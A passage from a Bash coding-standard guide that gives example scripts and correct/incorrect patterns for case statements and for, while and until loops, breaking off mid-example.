      info "Processing text document: $file"
      process_text "$file"
      ;;

    *.jpg|*.jpeg|*.png|*.gif)
      info "Processing image: $file"
      process_image "$file"
      ;;

    *.pdf)
      info "Processing PDF: $file"
      process_pdf "$file"
      ;;

    *.sh|*.bash)
      info "Processing shell script: $file"
      validate_script "$file"
      ;;

    *.json)
      info "Processing JSON: $file"
      validate_json "$file"
      ;;

    *.xml)
      info "Processing XML: $file"
      validate_xml "$file"
      ;;

    .*)
      warn "Skipping hidden file: $file"
      return 0
      ;;

    *.tmp|*.bak|*~)
      warn "Skipping temporary file: $file"
      return 0
      ;;

    *)
      error "Unknown file type: $file"
      return 1
      ;;
  esac
}

process_text() {
  local -- file="$1"
  # Text processing logic
}

process_image() {
  local -- file="$1"
  # Image processing logic
}

process_pdf() {
  local -- file="$1"
  # PDF processing logic
}

validate_script() {
  local -- file="$1"
  shellcheck "$file"
}

validate_json() {
  local -- file="$1"
  jq empty "$file"
}

validate_xml() {
  local -- file="$1"
  xmllint --noout "$file"
}

main() {
  local -a files=("$@")

  if [[ ${#files[@]} -eq 0 ]]; then
    die 22 'No files specified'
  fi

  local -- file
  for file in "${files[@]}"; do
    process_file_by_type "$file"
  done
}

main "$@"

#fin
```

**Action routing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Service control script
SERVICE_NAME='myapp'
PID_FILE="/var/run/$SERVICE_NAME.pid"

start_service() {
  if [[ -f "$PID_FILE" ]]; then
    warn "Service already running (PID: $(cat "$PID_FILE"))"
    return 0
  fi

  info "Starting $SERVICE_NAME..."
  # Start service logic
  success "$SERVICE_NAME started"
}

stop_service() {
  if [[ ! -f "$PID_FILE" ]]; then
    warn "Service not running"
    return 0
  fi

  local -i pid
  pid=$(cat "$PID_FILE")
  info "Stopping $SERVICE_NAME (PID: $pid)..."
  kill "$pid"
  rm -f "$PID_FILE"
  success "$SERVICE_NAME stopped"
}

restart_service() {
  info "Restarting $SERVICE_NAME..."
  stop_service
  sleep 1
  start_service
}

status_service() {
  if [[ -f "$PID_FILE" ]]; then
    local -i pid
    pid=$(cat "$PID_FILE")
    if kill -0 "$pid" 2>/dev/null; then
      info "$SERVICE_NAME is running (PID: $pid)"
      return 0
    else
      error "$SERVICE_NAME is not running (stale PID file)"
      return 1
    fi
  else
    info "$SERVICE_NAME is not running"
    return 3
  fi
}

reload_service() {
  if [[ ! -f "$PID_FILE" ]]; then
    die 1 'Service not running'
  fi

  local -i pid
  pid=$(cat "$PID_FILE")
  info "Reloading $SERVICE_NAME configuration..."
  kill -HUP "$pid"
  success 'Configuration reloaded'
}

main() {
  local -- action="${1:-}"

  if [[ -z "$action" ]]; then
    die 22 'No action specified (start|stop|restart|status|reload)'
  fi

  # Route to appropriate handler
  case "$action" in
    start)
      start_service
      ;;

    stop)
      stop_service
      ;;

    restart)
      restart_service
      ;;

    status)
      status_service
      ;;

    reload)
      reload_service
      ;;

    # Handle common variations
    st|stat)
      status_service
      ;;

    re|rest)
      restart_service
      ;;

    # Reject unknown actions
    *)
      die 22 "Invalid action: $action (use: start|stop|restart|status|reload)"
      ;;
  esac
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - quoting patterns unnecessarily
case "$value" in
  "start") echo 'Starting...' ;;    # Don't quote literal patterns
  "stop") echo 'Stopping...' ;;
esac

# ✓ Correct - unquoted literal patterns
case "$value" in
  start) echo 'Starting...' ;;
  stop) echo 'Stopping...' ;;
esac

# ✗ Wrong - not quoting the test variable
case $filename in    # Unquoted variable!
  *.txt) process_text ;;
esac

# ✓ Correct - quote the test variable
case "$filename" in
  *.txt) process_text ;;
esac

# ✗ Wrong - using if/elif for simple pattern matching
if [[ "$ext" == 'txt' ]]; then
  process_text
elif [[ "$ext" == 'pdf' ]]; then
  process_pdf
elif [[ "$ext" == 'md' ]]; then
  process_markdown
else
  die 1 'Unknown type'
fi

# ✓ Correct - case is clearer
case "$ext" in
  txt) process_text ;;
  pdf) process_pdf ;;
  md) process_markdown ;;
  *) die 1 'Unknown type' ;;
esac

# ✗ Wrong - missing default case
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
esac
# What if $action is 'restart'? Silent failure!

# ✓ Correct - always include default case
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  restart) restart_service ;;
  *) die 22 "Invalid action: $action" ;;
esac

# ✗ Wrong - inconsistent format mixing
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift
      OUTPUT="$1"
      ;;                 # Inconsistent - mixing compact and expanded
  -h) usage; exit 0 ;;
esac

# ✓ Correct - consistent compact format
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift; OUTPUT="$1" ;;
  -h) usage; exit 0 ;;
esac

# ✗ Wrong - poor column alignment
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force) FORCE=1 ;;        # Alignment is inconsistent
  -h|--help) usage; exit 0 ;;
esac

# ✓ Correct - consistent column alignment
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force)   FORCE=1 ;;
  -h|--help)    usage; exit 0 ;;
esac

# ✗ Wrong - not using ;; terminator
case "$value" in
  start) start_service
  stop) stop_service       # Missing ;;
esac

# ✓ Correct - always use ;; terminator
case "$value" in
  start) start_service ;;
  stop) stop_service ;;
esac

# ✗ Wrong - fall-through patterns (not supported in Bash)
case "$code" in
  200|201|204)
    success='true'       # Bash doesn't fall through!
  300|301|302)
    redirect='true'      # This won't work as intended
    ;;
esac

# ✓ Correct - explicit pattern grouping
case "$code" in
  200|201|204) success='true' ;;
  300|301|302) redirect='true' ;;
esac

# ✗ Wrong - regex patterns (not supported)
case "$input" in
  [0-9]+) echo 'Number' ;;    # Not regex! This matches single digit only
esac

# ✓ Correct - use proper pattern syntax
case "$input" in
  +([0-9])) echo 'Number' ;;  # Requires extglob
esac
# Or use if with regex:
if [[ "$input" =~ ^[0-9]+$ ]]; then
  echo 'Number'
fi

# ✗ Wrong - side effects in patterns
case "$value" in
  $(complex_function)) echo 'Match' ;;  # Function called for every case!
esac

# ✓ Correct - evaluate once before case
result=$(complex_function)
case "$value" in
  "$result") echo 'Match' ;;
esac

# ✗ Wrong - testing multiple variables
case "$var1" in
  value1) case "$var2" in    # Nested case - hard to read
    value2) action ;;
  esac ;;
esac

# ✓ Correct - use if for multiple variable tests
if [[ "$var1" == value1 && "$var2" == value2 ]]; then
  action
fi
```

**Edge cases and advanced patterns:**

**1. Empty string handling:**

```bash
# Empty string is a valid case
case "$value" in
  '') echo 'Empty string' ;;
  *) echo "Value: $value" ;;
esac

# Multiple empty possibilities
case "$input" in
  ''|' '|$'\t') echo 'Blank or whitespace' ;;
  *) echo 'Has content' ;;
esac
```

**2. Special characters in patterns:**

```bash
# Quote patterns with special characters
case "$filename" in
  'file (1).txt') echo 'Match parentheses' ;;
  'file [backup].txt') echo 'Match brackets' ;;
  'file$special.txt') echo 'Match dollar sign' ;;
  *) echo 'Other' ;;
esac

# Wildcards in middle of pattern
case "$path" in
  /usr/*/bin) echo 'Binary path under /usr' ;;
  /home/*/Documents) echo 'User documents folder' ;;
esac
```

**3. Numeric patterns (as strings):**

```bash
# Case treats everything as strings
case "$port" in
  80|443) echo 'Standard web port' ;;
  22) echo 'SSH port' ;;
  [0-9][0-9][0-9][0-9]) echo 'Four-digit port' ;;
  *) echo 'Other port' ;;
esac

# For numeric comparison, use (()) instead
if ((port == 80 || port == 443)); then
  echo 'Standard web port'
fi
```

**4. Extglob patterns:**

```bash
shopt -s extglob

case "$filename" in
  # Zero or one occurrence
  test?(s).txt)
    echo 'test.txt or tests.txt'
    ;;

  # Zero or more occurrences
  file*(backup).txt)
    echo 'file.txt, filebackup.txt, filebackupbackup.txt'
    ;;

  # One or more occurrences
  log+([0-9]).txt)
    echo 'log1.txt, log123.txt, etc.'
    ;;

  # Exactly one of the patterns
  @(README|LICENSE|CHANGELOG))
    echo 'Standard project file'
    ;;

  # Anything except the patterns
  !(*.tmp|*.bak))
    echo 'Not a temp or backup file'
    ;;

  *)
    echo 'Other file'
    ;;
esac
```

**5. Case statement in functions:**

```bash
# Return different values based on case
validate_input() {
  local -- input="$1"

  case "$input" in
    [a-z]*)
      info 'Valid lowercase input'
      return 0
      ;;

    [A-Z]*)
      warn 'Input should be lowercase'
      return 1
      ;;

    [0-9]*)
      error 'Input should not start with digit'
      return 2
      ;;

    '')
      error 'Input is empty'
      return 22
      ;;

    *)
      error 'Invalid input format'
      return 1
      ;;
  esac
}

# Use return value
if validate_input "$user_input"; then
  process_input "$user_input"
fi
```

**6. Multi-level case routing:**

```bash
# First level: action
main() {
  local -- action="$1"
  shift

  case "$action" in
    user)
      handle_user_commands "$@"
      ;;

    group)
      handle_group_commands "$@"
      ;;

    system)
      handle_system_commands "$@"
      ;;

    *)
      die 22 "Invalid action: $action"
      ;;
  esac
}

# Second level: subcommand
handle_user_commands() {
  local -- subcommand="$1"
  shift

  case "$subcommand" in
    add) add_user "$@" ;;
    delete) delete_user "$@" ;;
    list) list_users ;;
    *) die 22 "Invalid user subcommand: $subcommand" ;;
  esac
}

handle_group_commands() {
  local -- subcommand="$1"
  shift

  case "$subcommand" in
    add) add_group "$@" ;;
    delete) delete_group "$@" ;;
    list) list_groups ;;
    *) die 22 "Invalid group subcommand: $subcommand" ;;
  esac
}
```

**Summary:**

- **Use case for pattern matching** - testing single variable against multiple patterns
- **Compact format** - single-line actions with aligned `;;`
- **Expanded format** - multi-line actions with `;;` on separate line
- **Always quote test variable** - `case "$var" in` not `case $var in`
- **Don't quote literal patterns** - `start)` not `"start")`
- **Include default case** - always have `*)` to handle unexpected values
- **Use alternation** - `pattern1|pattern2|pattern3)` for multiple matches
- **Leverage wildcards** - `*.txt)` for glob patterns
- **Enable extglob** - for advanced pattern matching `@(pattern)`, `!(pattern)`
- **Align consistently** - choose compact or expanded, align actions at same column
- **Prefer case over if/elif** - for single-variable multi-value tests
- **Use if for complex logic** - multiple variables, ranges, complex conditions
- **Terminate with ;;** - every case branch needs `;;`

**Key principle:** Case statements excel at routing based on pattern matching of a single value. They're more readable, maintainable, and efficient than long if/elif chains for this purpose. Choose compact format for simple flag setting (argument parsing), expanded format for complex multi-line logic. Always include a default `*)` case to handle unexpected values explicitly. The visual alignment and pattern syntax make case statements self-documenting and easy to modify.


---


**Rule: BCS0703**

### Loops

**Use loops to iterate over collections, process command output, or repeat operations. Bash provides `for`, `while`, and `until` loops, each suited to different iteration patterns. Always prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ proper loop control with `break` and `continue` for early exits and conditional skipping.**

**Rationale:**

- **Collection Processing**: For loops efficiently iterate over arrays, globs, and ranges
- **Stream Processing**: While loops process line-by-line input from commands or files
- **Condition Looping**: While/until loops continue until condition changes
- **Array Safety**: Iterating arrays with `"${array[@]}"` preserves element boundaries
- **Process Substitution**: Using `< <(command)` avoids subshell variable scope issues
- **Loop Control**: Break and continue enable early exit and conditional processing
- **Readability**: Appropriate loop type makes intent immediately clear

**For loops - Array iteration:**

The most common and safest loop pattern in Bash.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Iterate over array elements
process_files() {
  local -a files=(
    'document.txt'
    'file with spaces.pdf'
    'report (final).doc'
  )

  local -- file
  for file in "${files[@]}"; do
    if [[ -f "$file" ]]; then
      info "Processing: $file"
      # Process file
    else
      warn "File not found: $file"
    fi
  done
}

# ✓ CORRECT - Iterate with index and value
process_indexed() {
  local -a items=('alpha' 'beta' 'gamma' 'delta')
  local -i index
  local -- item

  for index in "${!items[@]}"; do
    item="${items[$index]}"
    info "Item $index: $item"
  done
}

# ✓ CORRECT - Iterate over arguments
process_arguments() {
  local -- arg

  for arg in "$@"; do
    info "Argument: $arg"
  done
}

main() {
  process_files
  process_indexed
  process_arguments 'arg1' 'arg with spaces' 'arg3'
}

main "$@"

#fin
```

**For loops - Glob patterns:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Iterate over glob matches
process_text_files() {
  local -- file

  # nullglob ensures empty loop if no matches
  for file in "$SCRIPT_DIR"/*.txt; do
    info "Processing text file: $file"
    # Process file
  done
}

# ✓ CORRECT - Multiple glob patterns
process_documents() {
  local -- file

  for file in "$SCRIPT_DIR"/*.{txt,md,rst}; do
    if [[ -f "$file" ]]; then
      info "Processing document: $file"
      # Process file
    fi
  done
}

# ✓ CORRECT - Recursive glob (requires globstar)
process_all_scripts() {
  shopt -s globstar

  local -- script

  for script in "$SCRIPT_DIR"/**/*.sh; do
    if [[ -f "$script" ]]; then
      info "Found script: $script"
      shellcheck "$script"
    fi
  done
}

# ✓ CORRECT - Check if glob matched anything
process_with_check() {
  local -a matches=("$SCRIPT_DIR"/*.log)

  if [[ ${#matches[@]} -eq 0 ]]; then
    warn 'No log files found'
    return 1
  fi

  local -- file
  for file in "${matches[@]}"; do
    info "Processing log: $file"
  done
}

main() {
  process_text_files
  process_documents
  process_all_scripts
  process_with_check
}

main "$@"

#fin
```

**For loops - C-style:**

Use for numeric iteration with known range.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - C-style for loop
count_to_ten() {
  local -i i

  for ((i=1; i<=10; i+=1)); do
    echo "Count: $i"
  done
}

# ✓ CORRECT - Iterate with step
count_by_twos() {
  local -i i

  for ((i=0; i<=20; i+=2)); do
    echo "Even: $i"
  done
}

# ✓ CORRECT - Countdown
countdown() {
  local -i seconds="${1:-10}"
  local -i i

  for ((i=seconds; i>0; i-=1)); do
    echo "T-minus $i seconds..."
    sleep 1
  done

  echo 'Liftoff!'
}

# ✓ CORRECT - Array processing with index
process_with_index() {
  local -a items=('first' 'second' 'third' 'fourth')
  local -i i

  for ((i=0; i<${#items[@]}; i+=1)); do
    echo "Index $i: ${items[$i]}"
  done
}

main() {
  count_to_ten
  count_by_twos
  countdown 5
  process_with_index
}

main "$@"

#fin
```

**For loops - Brace expansion and sequences:**

```bash
# Range expansion (Bash 4+)
for i in {1..10}; do
  echo "Number: $i"
done

# Range with step (Bash 4+)
for i in {0..100..10}; do
  echo "Multiple of 10: $i"
done

# Character range
for letter in {a..z}; do
  echo "Letter: $letter"
done

# Brace expansion with strings
for env in {dev,staging,prod}; do
  echo "Deploy to: $env"
done

# Zero-padded numbers
for file in file{001..100}.txt; do
  echo "Filename: $file"
done
```

**While loops - Reading input:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Read file line by line
read_file() {
  local -- file="$1"
  local -- line
  local -i line_count=0

  while IFS= read -r line; do
    ((line_count+=1))
    echo "Line $line_count: $line"
  done < "$file"

  info "Total lines: $line_count"
}

# ✓ CORRECT - Process command output (avoid subshell)
process_command_output() {
  local -- line
  local -i count=0

  while IFS= read -r line; do
    ((count+=1))
    info "Processing: $line"
  done < <(find "$SCRIPT_DIR" -name '*.txt' -type f)

  info "Processed $count files"
}

# ✓ CORRECT - Read null-delimited input
process_null_delimited() {
  local -- file

  while IFS= read -r -d '' file; do
    info "Processing: $file"
  done < <(find "$SCRIPT_DIR" -name '*.sh' -type f -print0)
}

# ✓ CORRECT - Read CSV with custom delimiter
read_csv() {
  local -- csv_file="$1"
  local -- name email age

  while IFS=',' read -r name email age; do
    info "Name: $name, Email: $email, Age: $age"
  done < "$csv_file"
}

# ✓ CORRECT - Read with timeout
read_with_timeout() {
  local -- input

  info 'Enter your name (10 second timeout):'

  if read -r -t 10 input; then
    success "Hello, $input!"
  else
    warn 'Timed out waiting for input'
    return 1
  fi
}

main() {
  local -- test_file='/tmp/test.txt'
  echo -e "Line 1\nLine 2\nLine 3" > "$test_file"

  read_file "$test_file"
  process_command_output
  process_null_delimited

  rm -f "$test_file"
}

main "$@"

#fin
```

**While loops - Argument parsing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- OUTPUT_DIR=''
declare -a INPUT_FILES=()

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option $1 requires an argument"
  fi
}

# ✓ CORRECT - While loop for argument parsing
main() {
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -o|--output)
        noarg "$@"
        shift
        OUTPUT_DIR="$1"
        ;;

      -h|--help)
        usage
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option: $1"
        ;;

      *)
        INPUT_FILES+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments after --
  INPUT_FILES+=("$@")

  readonly -- VERBOSE DRY_RUN OUTPUT_DIR
  readonly -a INPUT_FILES

  # Validate
  if [[ ${#INPUT_FILES[@]} -eq 0 ]]; then
    die 22 'No input files specified'
  fi

  # Process files
  local -- file
  for file in "${INPUT_FILES[@]}"; do
    ((DRY_RUN)) && info "[DRY-RUN] Would process: $file"
    ((DRY_RUN)) || info "Processing: $file"
  done
}

main "$@"

#fin
```

**While loops - Condition-based:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Wait for condition
wait_for_file() {
  local -- file="$1"
  local -i timeout="${2:-30}"
  local -i elapsed=0

  info "Waiting for file: $file"

  while [[ ! -f "$file" ]]; do
    if ((elapsed >= timeout)); then
      error "Timeout waiting for file: $file"
      return 1
    fi

    sleep 1
    ((elapsed+=1))
  done

  success "File appeared after $elapsed seconds"
}

# ✓ CORRECT - Retry with exponential backoff
retry_command() {
  local -i max_attempts=5
  local -i attempt=1
  local -i wait_time=1

  while ((attempt <= max_attempts)); do
    info "Attempt $attempt of $max_attempts"

    if some_command; then
      success 'Command succeeded'
      return 0
    fi

    if ((attempt < max_attempts)); then
      warn "Failed, retrying in $wait_time seconds..."
      sleep "$wait_time"
      wait_time=$((wait_time * 2))  # Exponential backoff
    fi

    ((attempt+=1))
  done

  error 'All retry attempts failed'
  return 1
}

# ✓ CORRECT - Process until resource available
process_queue() {
  local -i max_items=100
  local -i processed=0

  while ((processed < max_items)); do
    if ! get_next_item; then
      info 'Queue empty'
      break
    fi

    process_item
    ((processed+=1))
  done

  info "Processed $processed items"
}

main() {
  wait_for_file '/tmp/ready.txt' 10
  retry_command
  process_queue
}

main "$@"

#fin
```

**Until loops:**

Until loops are less common but useful when the logic reads better as "until condition becomes true."

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Until loop (opposite of while)
wait_for_service() {
  local -- service="$1"
  local -i timeout="${2:-60}"
  local -i elapsed=0

  info "Waiting for service: $service"

  # Loop UNTIL service is running
  until systemctl is-active --quiet "$service"; do
    if ((elapsed >= timeout)); then
      error "Timeout waiting for service: $service"
      return 1
    fi

    sleep 1
    ((elapsed+=1))
  done

  success "Service started after $elapsed seconds"
}

# ✓ CORRECT - Until condition met
wait_until_ready() {
  local -- status_file="$1"
  local -i max_wait=30
  local -i waited=0

  until [[ -f "$status_file" && "$(cat "$status_file")" == 'READY' ]]; do
    if ((waited >= max_wait)); then
      error 'Timeout waiting for ready status'
      return 1
    fi

    sleep 1
    ((waited+=1))
  done

  info 'System ready'
}

# ✗ Generally avoid - while is usually clearer
# This until loop is confusing:
until [[ ! -f "$lock_file" ]]; do
  sleep 1
done

# ✓ Better - equivalent while loop is clearer:
while [[ -f "$lock_file" ]]; do
  sleep 1
done

main() {
  wait_for_service 'nginx' 30
  wait_until_ready '/tmp/status.txt'
}

main "$@"

#fin
```

**Loop control - break and continue:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Early exit with break
find_first_match() {
  local -- pattern="$1"
  local -a files=("$SCRIPT_DIR"/*)
  local -- file
  local -- found=''

  for file in "${files[@]}"; do
    if [[ -f "$file" && "$file" =~ $pattern ]]; then
      found="$file"
      info "Found match: $file"
      break  # Stop searching after first match
    fi
  done

  if [[ -n "$found" ]]; then
    echo "$found"
    return 0
  else
    return 1
  fi
}

# ✓ CORRECT - Skip items with continue
process_valid_files() {
  local -a files=("$@")
  local -- file
  local -i processed=0
  local -i skipped=0

  for file in "${files[@]}"; do
    # Skip non-existent files
    if [[ ! -f "$file" ]]; then
      warn "File not found: $file"
      ((skipped+=1))
      continue
    fi

    # Skip files we can't read
    if [[ ! -r "$file" ]]; then
      warn "File not readable: $file"
      ((skipped+=1))
      continue
    fi

    # Skip empty files
    if [[ ! -s "$file" ]]; then
      warn "File is empty: $file"
      ((skipped+=1))
      continue
    fi

    # Process file
    info "Processing: $file"
    # ... processing logic ...
    ((processed+=1))
  done

  info "Processed: $processed, Skipped: $skipped"
}

# ✓ CORRECT - Break out of nested loops
find_in_matrix() {
  local -a matrix=(
    'row1col1 row1col2 row1col3'
    'row2col1 row2col2 row2col3'
    'row3col1 target row3col3'
  )

  local -- row col
  local -i found=0

  for row in "${matrix[@]}"; do
    for col in $row; do
      if [[ "$col" == 'target' ]]; then
        info "Found target in row: $row"
        found=1
        break 2  # Break out of both loops
      fi
    done
  done

  ((found))
}

# ✓ CORRECT - Continue in while loop
process_log_file() {
  local -- log_file="$1"
  local -- line
  local -i errors=0

  while IFS= read -r line; do
    # Skip empty lines
    [[ -z "$line" ]] && continue

    # Skip comments
    [[ "$line" =~ ^# ]] && continue

    # Process error lines
    if [[ "$line" =~ ERROR ]]; then
      error "Error found: $line"
      ((errors+=1))
    fi
  done < "$log_file"

  info "Found $errors errors"
  return "$errors"
}

main() {
  find_first_match 'test'
  process_valid_files file1.txt file2.txt file3.txt
  find_in_matrix
  process_log_file '/var/log/app.log'
}

main "$@"

#fin
```

**Infinite loops:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Infinite loop with break condition
monitor_service() {
  local -- service="$1"
  local -i interval="${2:-5}"

  info "Monitoring service: $service (interval: ${interval}s)"

  while true; do
    if ! systemctl is-active --quiet "$service"; then
      error "Service $service is down!"
      # Could send alert here
    else
      info "Service $service is running"
    fi

    sleep "$interval"
  done
}

# ✓ CORRECT - Infinite loop with exit condition
daemon_loop() {
  local -- pid_file='/var/run/daemon.pid'

  # Create PID file
  echo "$$" > "$pid_file"

  # Cleanup on exit
  trap 'rm -f "$pid_file"' EXIT

  info 'Daemon started'

  while true; do
    # Check if we should stop
    if [[ ! -f "$pid_file" ]]; then
      info 'PID file removed, stopping daemon'
      break
    fi

    # Do work
    process_queue

    # Sleep between iterations
    sleep 1
  done

  info 'Daemon stopped'
}

# ✓ CORRECT - Interactive loop
interactive_menu() {
  local -- choice

  while true; do
    echo ''
    echo 'Menu:'
    echo '  1) Start service'
    echo '  2) Stop service'
    echo '  3) Check status'
    echo '  q) Quit'
    echo ''
    read -r -p 'Choice: ' choice

    case "$choice" in
      1) start_service ;;
      2) stop_service ;;
      3) check_status ;;
      q|Q) info 'Goodbye!'; break ;;
      *) warn 'Invalid choice' ;;
    esac
  done
}

main() {
  # monitor_service 'nginx' 10  # Would run forever
  # daemon_loop  # Would run forever
  interactive_menu
}

main "$@"

#fin
```

**Nested loops:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Process matrix data
process_matrix() {
  local -a rows=('row1' 'row2' 'row3')
  local -a cols=('col1' 'col2' 'col3')
  local -- row col

  for row in "${rows[@]}"; do
    for col in "${cols[@]}"; do
      echo "Processing: $row, $col"
    done
  done
}

# ✓ CORRECT - Cross-product iteration
test_combinations() {
  local -a environments=('dev' 'staging' 'prod')
  local -a regions=('us-east' 'us-west' 'eu-west')
  local -- env region

  for env in "${environments[@]}"; do
    for region in "${regions[@]}"; do
      info "Testing: $env in $region"
      # Run tests
    done
  done
}

# ✓ CORRECT - Process directory tree
process_tree() {
  local -- base_dir="$1"
  local -a dirs=("$base_dir"/*)
  local -- dir file

  for dir in "${dirs[@]}"; do
    if [[ ! -d "$dir" ]]; then
      continue
    fi

    info "Processing directory: $dir"

    for file in "$dir"/*; do
      if [[ -f "$file" ]]; then
        info "  Processing file: $file"
      fi
    done
  done
}

main() {
  process_matrix
  test_combinations
  process_tree "$SCRIPT_DIR"
}

main "$@"

#fin
```

**Complete example - File processor with multiple loop types:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i MAX_RETRIES=3
declare -- OUTPUT_DIR=''
declare -a INPUT_PATTERNS=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ⚠" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option $1 requires an argument"
  fi
}

# Retry command with backoff
retry_with_backoff() {
  local -i attempt=1
  local -i wait_time=1

  while ((attempt <= MAX_RETRIES)); do
    ((VERBOSE)) && info "Attempt $attempt of $MAX_RETRIES"

    if "$@"; then
      return 0
    fi

    if ((attempt < MAX_RETRIES)); then
      warn "Failed, retrying in $wait_time seconds..."
      sleep "$wait_time"
      wait_time=$((wait_time * 2))
    fi

    ((attempt+=1))
  done

  error "All $MAX_RETRIES attempts failed"
  return 1
}

# ============================================================================
# Business Logic
# ============================================================================

# Process single file with retry logic
process_file() {
  local -- file="$1"

  # Validate file
  if [[ ! -f "$file" ]]; then
    error "File not found: $file"
    return 2
  fi

  if [[ ! -r "$file" ]]; then
    error "File not readable: $file"
    return 1
  fi

  if [[ ! -s "$file" ]]; then
    warn "File is empty: $file"
    return 0
  fi

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would process: $file"
    return 0
  fi

  info "Processing: $file"

  # Process file line by line
  local -- line
  local -i line_count=0

